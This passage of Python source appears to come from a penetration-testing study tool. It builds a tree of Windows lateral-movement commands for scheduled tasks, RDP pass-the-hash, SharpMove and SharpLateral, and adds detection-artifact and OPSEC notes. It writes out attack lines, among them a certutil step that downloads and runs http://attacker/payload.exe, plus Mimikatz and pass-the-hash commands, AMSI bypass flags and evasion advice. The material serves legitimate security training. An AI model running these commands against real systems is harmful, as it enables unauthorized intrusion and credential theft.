                'command': f'At \\\\{target} 11:00:00PM shutdown -r',
                'description': 'Schedule task via legacy AT command',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'WINDOWS'],
                'flag_explanations': {
                    '\\\\target': 'Remote target UNC path',
                    'time': 'Execution time (24-hour format)',
                    'command': 'Command to execute at scheduled time'
                },
                'success_indicators': [
                    'Task scheduled successfully',
                    'Task executes at specified time',
                    'AT command lists scheduled task'
                ],
                'failure_indicators': [
                    'Access denied: Not admin',
                    'AT service not running (deprecated on modern Windows)',
                    'Network path not found'
                ],
                'next_steps': [
                    'List scheduled tasks: At \\\\{target}',
                    'Delete task: At \\\\{target} <TaskID> /delete',
                    'Use schtasks for modern Windows: See "schtasks" task'
                ],
                'alternatives': [
                    f'schtasks: Modern replacement (see schtasks tasks)',
                    f'Impacket atexec.py: atexec.py DOMAIN/user:Password@{target} whoami',
                    'Manual: Task Scheduler MMC snap-in'
                ],
                'notes': 'AT command deprecated on Windows 8/Server 2012+. Use schtasks instead. Requires Task Scheduler service running. Executes with SYSTEM privileges.'
            }
        })

        # 5.2 schtasks command
        schtasks_parent['children'].append({
            'id': f'schtasks-create-{target}',
            'name': 'Create and Execute Scheduled Task (schtasks)',
            'type': 'command',
            'metadata': {
                'command': f'schtasks /create /S {target} /SC once /ST 00:00 /TN "MyTask" /TR "cmd.exe /c whoami > C:\\\\temp\\\\out.txt" /RU SYSTEM && schtasks /run /tn "MyTask" /S {target}',
                'description': 'Create and execute scheduled task remotely',
                'tags': ['OSCP:HIGH', 'MANUAL', 'WINDOWS'],
                'flag_explanations': {
                    '/create': 'Create new scheduled task',
                    '/S target': 'Remote system',
                    '/SC once': 'Schedule type (once, daily, weekly, onstart, onlogon)',
                    '/ST 00:00': 'Start time (HH:MM 24-hour)',
                    '/TN "TaskName"': 'Task name',
                    '/TR "command"': 'Task to run (executable or command)',
                    '/RU SYSTEM': 'Run as user (SYSTEM, or DOMAIN\\user)',
                    '/RP password': 'Password for /RU user',
                    '/run': 'Execute task immediately',
                    '/tn "TaskName"': 'Task name to run',
                    '/delete': 'Delete task (cleanup)',
                    '/F': 'Force (suppress prompts)'
                },
                'success_indicators': [
                    'SUCCESS: The scheduled task "TaskName" has successfully been created',
                    'Task executes (check output file or process list)',
                    'Event ID 4698 (Task Created) in Security log'
                ],
                'failure_indicators': [
                    'ERROR: Access is denied (not admin)',
                    'ERROR: The network path was not found (firewall/offline)',
                    'Task created but fails to run (check task definition)'
                ],
                'next_steps': [
                    'Retrieve output: type \\\\{target}\\C$\\temp\\out.txt',
                    'Delete task: schtasks /delete /tn "MyTask" /S {target} /F',
                    'List tasks: schtasks /query /S {target} /V /FO LIST',
                    'Execute reverse shell: Create task with PowerShell payload'
                ],
                'alternatives': [
                    f'Impacket atexec: atexec.py DOMAIN/user:Password@{target} whoami',
                    f'PowerShell payload: /TR "powershell -enc <base64>"',
                    f'Download and execute: /TR "certutil -urlcache -f http://attacker/payload.exe C:\\temp\\p.exe && C:\\temp\\p.exe"',
                    f'SharpLateral: SharpLateral.exe schedule {target} C:\\payload.exe TaskName',
                    f'SharpMove: SharpMove.exe action=taskscheduler computername={target} command="payload.exe" taskname=Debug'
                ],
                'notes': 'schtasks is the modern replacement for AT command. Tasks run with privileges of /RU user. /SC once with /ST 00:00 then /run executes immediately. Cleanup: Delete task after execution. Silver Ticket abuse possible: Create task with forged TGS for HOST/target.'
            }
        })

        # 5.3 Impacket atexec.py
        schtasks_parent['children'].append({
            'id': f'impacket-atexec-{target}',
            'name': 'Impacket atexec.py',
            'type': 'command',
            'metadata': {
                'command': f'atexec.py DOMAIN/user:Password@{target} whoami',
                'description': 'Execute commands via AT/Scheduled Tasks',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'LINUX'],
                'flag_explanations': {
                    'DOMAIN/user:Password@target': 'Credentials and target',
                    '-hashes LMHASH:NTHASH': 'Pass-the-Hash authentication',
                    'command': 'Command to execute (output returned)'
                },
                'success_indicators': [
                    'Command output displayed',
                    'Task executes successfully',
                    'Output retrieved automatically'
                ],
                'failure_indicators': [
                    'Access denied: Not admin',
                    'Task Scheduler unavailable'
                ],
                'next_steps': [
                    'Execute reverse shell',
                    'Upload and execute payload',
                    'Chain with credential dumping'
                ],
                'alternatives': [
                    f'Pass-the-Hash: atexec.py -hashes :NTHASH DOMAIN/user@{target} whoami',
                    f'Manual schtasks: See "schtasks" task',
                    f'SharpLateral: SharpLateral.exe schedule {target} payload.exe TaskName'
                ],
                'notes': 'Automatically creates task, executes, retrieves output, and cleans up. Convenient wrapper around schtasks. Supports Pass-the-Hash.'
            }
        })

        tasks['children'].append(schtasks_parent)

        # ========================================
        # 6. RDP-Based Execution
        # ========================================
        rdp_tasks = {
            'id': f'rdp-techniques-{target}',
            'name': 'RDP-Based Execution (RDPexec)',
            'type': 'parent',
            'children': []
        }

        # 6.1 RDP Login
        rdp_tasks['children'].append({
            'id': f'rdp-login-{target}',
            'name': 'RDP Interactive Login',
            'type': 'command',
            'metadata': {
                'command': f'xfreerdp /v:{target} /u:username /p:password /cert-ignore',
                'description': 'Interactive RDP login and command execution',
                'tags': ['OSCP:HIGH', 'MANUAL', 'LINUX'],
                'flag_explanations': {
                    '/v:': 'Target hostname or IP',
                    '/u:': 'Username',
                    '/p:': 'Password',
                    '/d:': 'Domain',
                    '/cert-ignore': 'Ignore certificate warnings',
                    '/pth:': 'Pass-the-Hash (Restricted Admin mode required)',
                    '+clipboard': 'Enable clipboard sharing',
                    '/drive:share,/tmp': 'Share local directory',
                    '/size:1920x1080': 'Screen resolution',
                    '/f': 'Fullscreen mode'
                },
                'success_indicators': [
                    'RDP session established',
                    'Windows desktop appears',
                    'Can interact with GUI'
                ],
                'failure_indicators': [
                    'Connection failed: RDP disabled or firewalled (3389)',
                    'Authentication failed: Invalid credentials',
                    'CredSSP error: NLA required but not supported',
                    'Access denied: User not in Remote Desktop Users group'
                ],
                'next_steps': [
                    'Open cmd.exe or PowerShell',
                    'Execute enumeration commands',
                    'Transfer files via clipboard or shared drive',
                    'Establish persistence (startup folder, scheduled task)',
                    'Disconnect: Close session or logout'
                ],
                'alternatives': [
                    f'Windows: mstsc.exe /v:{target}',
                    f'Pass-the-Hash: xfreerdp /v:{target} /u:user /pth:NTHASH /cert-ignore',
                    f'rdesktop: rdesktop -u user -p password {target}',
                    f'With drive share: xfreerdp /v:{target} /u:user /p:pass /drive:share,/tmp',
                    'Python PyRDP: Intercept and record RDP sessions'
                ],
                'notes': 'RDPexec = Execute commands after RDP login (not automated like other methods). Requires: RDP enabled (port 3389), user in Remote Desktop Users or Administrators. Pass-the-Hash requires Restricted Admin mode (reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0). For pentesting RDP service: See network-services-pentesting/pentesting-rdp.md'
            }
        })

        # 6.2 RDP with PTH (Restricted Admin)
        rdp_tasks['children'].append({
            'id': f'rdp-pth-{target}',
            'name': 'RDP Pass-the-Hash (Restricted Admin)',
            'type': 'command',
            'metadata': {
                'command': f'xfreerdp /v:{target} /u:username /pth:NTHASH /cert-ignore',
                'description': 'RDP login using NTLM hash (Restricted Admin mode)',
                'tags': ['OSCP:MEDIUM', 'LINUX', 'PTH'],
                'flag_explanations': {
                    '/pth:': 'NTLM hash for Pass-the-Hash',
                    '/cert-ignore': 'Ignore certificate errors'
                },
                'success_indicators': [
                    'RDP session established with hash only',
                    'No password required',
                    'Desktop appears'
                ],
                'failure_indicators': [
                    'Protocol error: Restricted Admin mode not enabled',
                    'Authentication failed: Hash incorrect or account disabled'
                ],
                'next_steps': [
                    'Execute commands in session',
                    'Dump additional credentials',
                    'Pivot to other systems'
                ],
                'alternatives': [
                    'Enable Restricted Admin (requires admin): reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0',
                    'Mimikatz: sekurlsa::pth /user:username /domain:DOMAIN /ntlm:HASH /run:"mstsc.exe /restrictedadmin"',
                    'Normal RDP with password: See "RDP Interactive Login"'
                ],
                'notes': 'Requires Restricted Admin mode enabled on target (Windows 8.1+/Server 2012 R2+). Registry: HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin = 0. Attack surface reduced in recent Windows versions (disabled by default).'
            }
        })

        tasks['children'].append(rdp_tasks)

        # ========================================
        # 7. SCMExec (Service Control Manager)
        # ========================================
        scm_tasks = {
            'id': f'scm-techniques-{target}',
            'name': 'SCMExec (Service Control Manager)',
            'type': 'parent',
            'children': []
        }

        scm_tasks['children'].append({
            'id': f'scmexec-sharpmove-{target}',
            'name': 'SCMExec via SharpMove',
            'type': 'command',
            'metadata': {
                'command': f'SharpMove.exe action=scm computername={target} command="C:\\\\windows\\\\temp\\\\payload.exe" servicename=WindowsDebug amsi=true',
                'description': 'Execute via Service Control Manager (SCM) with UAC/Defender bypass',
                'tags': ['OSCP:MEDIUM', 'WINDOWS', 'AUTOMATED'],
                'flag_explanations': {
                    'action=scm': 'Use Service Control Manager method',
                    'computername=': 'Target hostname',
                    'command=': 'Command or executable path',
                    'servicename=': 'Custom service name',
                    'amsi=true': 'Enable AMSI bypass',
                    'username=': 'Credentials (if not current user)',
                    'password=': 'Password'
                },
                'success_indicators': [
                    'Service created successfully',
                    'Payload executes',
                    'AMSI bypass successful (if PowerShell)'
                ],
                'failure_indicators': [
                    'Access denied: Not admin',
                    'Service creation blocked: AV/EDR',
                    'UAC prevented execution'
                ],
                'next_steps': [
                    'Verify execution: Check process list on target',
                    'Cleanup: Delete service manually if SharpMove fails',
                    'Try alternative methods if blocked'
                ],
                'alternatives': [
                    'Manual sc.exe: See "Manual Service Execution (sc.exe)" task',
                    'PsExec: See "Sysinternals PsExec.exe" task',
                    'Impacket psexec.py/smbexec.py: See respective tasks'
                ],
                'notes': 'SCMExec can bypass some UAC and Windows Defender controls. SharpMove GitHub: https://github.com/0xthirteen/SharpMove. Similar to PsExec but with additional evasion techniques. Requires local admin and SMB access.'
            }
        })

        tasks['children'].append(scm_tasks)

        # ========================================
        # 8. Additional Tools & Techniques
        # ========================================
        additional_tasks = {
            'id': f'additional-techniques-{target}',
            'name': 'Additional Tools & Techniques',
            'type': 'parent',
            'children': []
        }

        # 8.1 SharpLateral (multi-method)
        additional_tasks['children'].append({
            'id': f'sharplateral-{target}',
            'name': 'SharpLateral (Multi-Method C# Tool)',
            'type': 'command',
            'metadata': {
                'command': f'SharpLateral.exe redwmi {target} C:\\\\Users\\\\Administrator\\\\Desktop\\\\malware.exe',
                'description': 'Multi-method lateral movement tool (C#)',
                'tags': ['OSCP:MEDIUM', 'WINDOWS', 'AUTOMATED'],
                'flag_explanations': {
                    'redwmi': 'WMI-based execution',
                    'reddcom': 'DCOM-based execution',
                    'redexec': 'Service-based execution (PsExec-like)',
                    'target': 'Target hostname',
                    'payload': 'Executable path (on target or UNC)',
                    'ServiceName': 'Service name (for redexec)'
                },
                'success_indicators': [
                    'Payload executes on target',
                    'Method completes successfully',
                    'Process visible on target'
                ],
                'failure_indicators': [
                    'Access denied: Not admin',
                    'Method unavailable: Service disabled or blocked',
                    'Payload not found: Check path'
                ],
                'next_steps': [
                    'Try different methods: redwmi, reddcom, redexec',
                    'Upload payload first if not present',
                    'Verify execution via process list or output'
                ],
                'alternatives': [
                    f'WMI: SharpLateral.exe redwmi {target} payload.exe',
                    f'DCOM: SharpLateral.exe reddcom {target} payload.exe',
                    f'Service: SharpLateral.exe redexec {target} payload.exe malware.exe ServiceName',
                    'Impacket tools: psexec.py, wmiexec.py, dcomexec.py'
                ],
                'notes': 'SharpLateral GitHub: https://github.com/mertdas/SharpLateral. Implements multiple lateral movement methods in single C# tool. Payload must be accessible to target (local path or UNC share).'
            }
        })

        # 8.2 SharpMove (comprehensive)
        additional_tasks['children'].append({
            'id': f'sharpmove-{target}',
            'name': 'SharpMove (Comprehensive Lateral Movement)',
            'type': 'command',
            'metadata': {
                'command': f'SharpMove.exe action=wmi computername={target} command="C:\\\\windows\\\\temp\\\\payload.exe" amsi=true username=DOMAIN\\\\user password=password',
                'description': 'Comprehensive lateral movement tool with multiple methods',
                'tags': ['OSCP:MEDIUM', 'WINDOWS', 'AUTOMATED'],
                'flag_explanations': {
                    'action=wmi': 'WMI execution',
                    'action=dcom': 'DCOM execution',
                    'action=taskscheduler': 'Scheduled task execution',
                    'action=scm': 'Service Control Manager',
                    'action=modsvc': 'Modify existing service',
                    'action=query': 'WMI query',
                    'computername=': 'Target hostname',
                    'command=': 'Command/executable',
                    'amsi=true': 'AMSI bypass',
                    'method=': 'DCOM method (MMC20, ShellBrowserWindow)',
                    'servicename=': 'Service name',
                    'taskname=': 'Task name'
                },
                'success_indicators': [
                    'Action completed successfully',
                    'Payload executes',
                    'AMSI bypass successful'
                ],
                'failure_indicators': [
                    'Access denied',
                    'Method unavailable',
                    'Authentication failed'
                ],
                'next_steps': [
                    'Try different actions if one fails',
                    'Query first: action=query to enumerate',
                    'Modify existing service: action=modsvc for stealth'
                ],
                'alternatives': [
                    f'WMI: action=wmi (or use wmiexec.py)',
                    f'DCOM: action=dcom method=ShellBrowserWindow',
                    f'Task Scheduler: action=taskscheduler taskname=Debug',
                    f'SCM: action=scm servicename=WindowsDebug',
                    f'Modify service: action=modsvc servicename=ExistingService',
                    'Start service: action=startservice servicename=ServiceName'
                ],
                'notes': 'SharpMove GitHub: https://github.com/0xthirteen/SharpMove. Most comprehensive C# lateral movement tool. Supports: WMI, DCOM, Task Scheduler, SCM, service modification. action=modsvc modifies existing service (stealthier). action=query for WMI reconnaissance.'
            }
        })

        tasks['children'].append(additional_tasks)

        # ========================================
        # 9. Detection & OPSEC Considerations
        # ========================================
        opsec_tasks = {
            'id': f'opsec-lateral-{target}',
            'name': 'Detection & OPSEC Considerations',
            'type': 'parent',
            'children': []
        }

        opsec_tasks['children'].append({
            'id': f'opsec-artifacts-{target}',
            'name': 'Common Artifacts & Detection Signatures',
            'type': 'manual',
            'metadata': {
                'description': 'Understanding lateral movement artifacts for evasion and cleanup',
                'tags': ['OSCP:MEDIUM', 'RESEARCH', 'OPSEC'],
                'notes': '''
OPSEC & Detection Artifacts:

PsExec/SMBExec/Service-Based:
- Event ID 4624 (Logon Type 3) - Network logon
- Event ID 4672 (Special Privileges) - Admin logon
- Event ID 5140/5145 - File share access (ADMIN$)
- Event ID 7045 - Service install (PSEXESVC, RemComSvc, custom)
- Sysmon Event ID 1 - Process creation (services.exe parent)
- Sysmon Event ID 3 - Network connection
- Sysmon Event ID 11 - File create (C:\\Windows\\*.exe)
- Sysmon Event ID 17/18 - Named pipe created/connected (\\\\pipe\\psexesvc, \\\\pipe\\remcom_*)
- Registry: HKCU\\Software\\Sysinternals\\PsExec\\EulaAccepted (operator host)
- File: C:\\Windows\\PSEXESVC.exe or random 8-char .exe

WMI-Based:
- Event ID 4624 (Logon Type 3)
- WMI Event logs (Microsoft-Windows-WMI-Activity/Operational)
- Sysmon Event ID 1 - Process creation (wmiprvse.exe parent)
- Sysmon Event ID 3 - Network connection to DCOM/WMI ports (135, 445)
- No binary dropped (more stealthy)
- Process creation via win32_process.Create

DCOM-Based:
- Event ID 4624 (Logon Type 3)
- DCOM activation logs
- Sysmon Event ID 1 - Process creation (unusual parent processes)
- Sysmon Event ID 3 - DCOM ports (135)
- Excel.exe, MMC.exe running unexpectedly
- No service install events

WinRM/PowerShell Remoting:
- Event ID 4624 (Logon Type 3 or 11 - Network/RemoteInteractive)
- Event ID 4648 - Explicit credential logon
- PowerShell Event ID 4103/4104 - Script block logging
- WinRM Event logs (Microsoft-Windows-WinRM/Operational)
- Event ID 91/168 - Session creation
- Sysmon Event ID 3 - Port 5985/5986

Scheduled Tasks:
- Event ID 4698 - Scheduled task created
- Event ID 4702 - Scheduled task updated
- Event ID 106 - Task registered (TaskScheduler/Operational)
- Task files: C:\\Windows\\System32\\Tasks\\
- Sysmon Event ID 1 - taskeng.exe/svchost.exe parent

RDP:
- Event ID 4624 (Logon Type 10) - RemoteInteractive
- Event ID 4778/4779 - Session reconnect/disconnect
- Event ID 21/22/24/25 - RDP-LocalSessionManager
- RDP cache: C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\
- Bitmap cache can reveal accessed resources

General Hunting/Detection:
- Alert on service installs with suspicious ImagePath (cmd.exe /c, powershell.exe, TEMP locations)
- Monitor process creations with ParentImage = services.exe, wmiprvse.exe executing shells
- Flag named pipes: *-stdin, *-stdout, *-stderr, remcom_*, psexec*
- Monitor ADMIN$ access from non-DC systems
- Alert on scheduled tasks created remotely
- Track lateral movement across multiple systems (credential reuse patterns)
- Monitor for unusual DCOM activations
- PowerShell script block logging for encoded commands

OPSEC Best Practices:
- Prefer WMI/DCOM over PsExec (fewer artifacts)
- Use Kerberos instead of NTLM where possible (hostname/FQDN vs IP)
- Customize service/task names (avoid defaults like PSEXESVC)
- Clean up: Delete services, tasks, dropped files
- Avoid noisy scanning (targeted vs spray-and-pray)
- Use fileless techniques (smbexec.py, wmiexec.py)
- Monitor your own artifacts during testing
- Time delays between attempts (avoid rapid-fire detection)

Hardening Notes (Windows 11 24H2 / Server 2025):
- SMB signing required by default (prevents unsigned relay)
- SMB client NTLM blocking (blocks NTLM fallback when connecting by IP)
- Use Kerberos (hostname/FQDN) or configure exceptions
- Just-in-Time/Just-Enough Admin reduces persistent admin access
- LAPS for local admin password rotation
- Monitor Event ID 7045 (service installs)
- Disable unnecessary services (WinRM, RDP if not needed)
- Restrict DCOM/WMI access via firewall and permissions
'''
            }
        })

        tasks['children'].append(opsec_tasks)

        # ========================================
        # 10. Reference & Further Reading
        # ========================================
        reference_tasks = {
            'id': f'reference-lateral-{target}',
            'name': 'References & Further Reading',
            'type': 'parent',
            'children': []
        }

        reference_tasks['children'].append({
            'id': f'references-{target}',
            'name': 'Lateral Movement References',
            'type': 'manual',
            'metadata': {
                'description': 'External resources and tools for lateral movement',
                'tags': ['RESEARCH', 'OSCP:LOW'],
                'notes': '''
Tool Repositories:
- Impacket: https://github.com/fortra/impacket
- Sysinternals PsExec: https://learn.microsoft.com/sysinternals/downloads/psexec
- Evil-WinRM: https://github.com/Hackplayers/evil-winrm
- SharpLateral: https://github.com/mertdas/SharpLateral
- SharpMove: https://github.com/0xthirteen/SharpMove
- SharpWMI: https://github.com/GhostPack/SharpWMI
- Invoke-DCOM.ps1: https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec

Research & Techniques:
- PsExec & Services: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
- WMI & WinRM: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/
- MMC20.Application DCOM: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
- ShellWindows DCOM: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
- Excel DDE DCOM: https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom
- SMB Security Hardening (2025): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

HackTricks Pages:
- PsExec/WinExec: hacktricks/windows-hardening/lateral-movement/psexec-and-winexec.md
- WmiExec: hacktricks/windows-hardening/lateral-movement/wmiexec.md
- DCOM Exec: hacktricks/windows-hardening/lateral-movement/dcomexec.md
- WinRM: hacktricks/network-services-pentesting/5985-5986-pentesting-winrm.md
- RDP: hacktricks/network-services-pentesting/pentesting-rdp.md
- AtExec: hacktricks/windows-hardening/lateral-movement/atexec.md
- SCMExec: hacktricks/windows-hardening/lateral-movement/scmexec.md

OSCP Exam Relevance:
- Focus on manual methods (sc.exe, wmic, schtasks, PowerShell)
- Understand how tools work (don't just run Impacket blindly)
- Practice credential Pass-the-Hash techniques
- Know manual alternatives if tools fail
- Time management: WMI/WinRM faster than RDP for command execution
- Document sources: Always note how you gained access

Recommended Practice Flow:
1. Obtain credentials (password, hash, or ticket)
2. Validate credentials: crackmapexec smb <target> -u USER -p PASS
3. Choose method based on open ports/services:
   - Port 445 open: PsExec, SMBExec, WMI
   - Port 5985/5986 open: WinRM (fastest for command execution)
   - Port 3389 open: RDP (for GUI access)
   - Port 135 + 445: DCOM, WMI, SCM
4. Execute enumeration commands
5. Establish persistence if needed
6. Pivot to additional systems
7. Document timeline and credentials
8. Cleanup artifacts
'''
            }
        })

        tasks['children'].append(reference_tasks)

        return tasks
